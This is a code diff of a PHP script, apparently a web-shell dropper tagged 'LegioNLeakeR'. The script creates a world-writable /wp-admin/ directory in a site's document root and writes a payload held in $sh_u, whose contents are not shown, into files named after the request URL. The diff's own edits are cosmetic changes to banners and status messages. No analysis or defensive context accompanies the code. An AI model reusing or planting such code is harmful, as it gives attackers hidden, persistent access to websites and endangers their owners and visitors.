@@ -1,4 +1,6 @@
 <?php 
+echo "LegioNLeakeR";
+echo "\n\n";
 $url = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 function file_name($url)
 {
@@ -11,12 +13,12 @@ $test_dir = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/';
 if (!file_exists($test_dir)) {
    
     if (mkdir($test_dir,0777)) {
-        echo "OK1";
+        echo "OK";
     } else {
         echo "Fail Create-Folder";
     }
 } else {
-    echo "OK1 Exists";
+    echo "OK";
 }
 // 
 $path = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/' . file_name($url); 
@@ -43,6 +45,6 @@ $fu = fopen($path_u, "w");
 if ($fu === false) {
     @file_put_contents($path_u, $sh_u);
 } else {
-    fwrite($fu, $sh_u);
+    $bytes_written = fwrite($fu, $sh_u);
     fclose($fu);
 } 
